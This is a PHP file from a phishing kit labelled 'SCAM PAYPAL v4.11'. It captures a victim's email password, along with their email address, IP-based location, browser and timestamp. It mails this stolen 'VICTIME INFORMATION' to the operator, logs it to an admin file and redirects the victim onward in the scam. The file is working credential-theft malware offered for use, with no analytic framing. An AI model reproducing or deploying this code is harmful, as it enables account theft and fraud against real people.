<?php
/*   


                              #=======================#
                              #   SCAM PAYPAL v4.11   #
                              #    XVerGinia-V.41     #
                              #=======================#
                  
*/


session_start();
date_default_timezone_set('GMT');
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Config.php');
include('../../functions/get_browser.php');
$inputMailBox = $_SESSION['inputMailBox'] = $_POST['inputMailBox'];
$Z118_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>NEW Email Address Pass</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>MailBox INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Email Address] = <font style='color:#0070ba;'>".$_SESSION['_mailbox_']."</font><br>
<font style='color:#9c0000;'>℗</font> [Email Password] = <font style='color:#0070ba;'>".$_SESSION["inputMailBox"]."</font><br>
±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>IP LOOKUP INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
<font style='color:#9c0000;'>✪</font> [State]	= <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## <font style='color: #820000;'>BY xXXx.BLBD XV4</font> #####################
</div></html>\n";

        $Z118_SUBJECT = "NEW XD ♥ MailBox INFO ♥ FROM : ".$_SESSION['_forlogin_']." ✪ ".$_SESSION['_mailbox_']." ✪";
        $Z118_HEADERS .= "From:XVerGinia.V4 ♥<noreply@logins.com>";
        $Z118_HEADERS .= $_POST['eMailAdd']."\n";
        $Z118_HEADERS .= "MIME-Version: 1.0\n";
        $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
       
        @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
		$zbi = fopen("../../../../ADMIN-XV3/ID.html", "a");
	fwrite($zbi, $Z118_MESSAGE);
HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
?>